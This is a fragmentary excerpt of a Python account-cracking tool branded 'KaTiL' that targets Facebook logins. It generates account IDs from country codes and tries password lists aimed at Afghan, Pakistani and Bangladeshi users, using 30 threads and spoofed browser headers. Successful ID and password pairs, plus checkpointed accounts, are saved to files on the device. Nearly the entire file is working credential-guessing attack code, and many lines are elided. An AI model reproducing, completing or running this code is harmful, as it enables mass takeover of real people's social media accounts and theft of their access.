...
def menu():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        linex()
                        tks = ("Hi KaTiL Sir, I Need To Buy Your Paid KaTiL PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
...
def m_m1():
                ...
                with tred(max_workers=30) as KaTiL:     
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khankhan','khan1122','khan12345','afghanistan','afghan']
...
def rdx1():
                ...
                with tred(max_workers=30) as KaTiL:     
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khankhan','khan1122','khan12345','pakistan','pak123','pubg123','khanbaba','khanzada','kingkhan','peshawar1122','pubg123','khan123','pubg1122']
                                KaTiL.submit(trt1,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
...
def bdm2():
                ...
                with tred(max_workers=30) as KaTiL:     
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'freefire','bangladish']
                                KaTiL.submit(trt1,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
...
def afg1():
                ...
                with tred(max_workers=30) as KaTiL:     
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'afghanistan','afghan','kabul','kabul123','afghan123','khankhan','janjan','pubg123','khan1122','khan123','afghan1122','100200','200300','500500','500600','10002000','20003000','50006000','۱۲۳۴۵۶۷۸۹','۱۲۳۴۵۶']
                                KaTiL.submit(trt1,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
        ...
        "Content-Length": str(clen),
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m[KaTiL-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                ...
                                if uid in oks:pass
                                       ...
                                       # print('\r\r\x1b[1;96m[KaTiL-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/KaTiL-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m[KaTiL-M1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="116.0.5820.204", "Google Chrome";v="116.0.5820.204"',
                        'sec-ch-ua-mobile': '?0',
                        ...
                        'user-agent': 'Mozilla/5.0 (X11; U; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5820.204 Safari/537.36',
                        'viewport-width': '980',}
                        ...
                        if "c_user" in KaTiL:
                                ...
                                print('\r\r\033[1;32m[KaTiL-OK] %s | %s'%(ids,pas))
                                open('/sdcard/KaTiL-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in AWAN:
                                if 'y' in pcp:
...
def api(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m[KaTiL-M2] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m[KaTiL-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/KaTiL-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if uid in oks:pass
                                      ...
                                      #  print('\r\r\033[1;31m[KaTiL-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/KaTiL-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
...
def api1(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m[KaTiL-M3] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/KaTiL-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m[KaTiL-OK] '+uid+' | '+pas+'\033[1;97m')
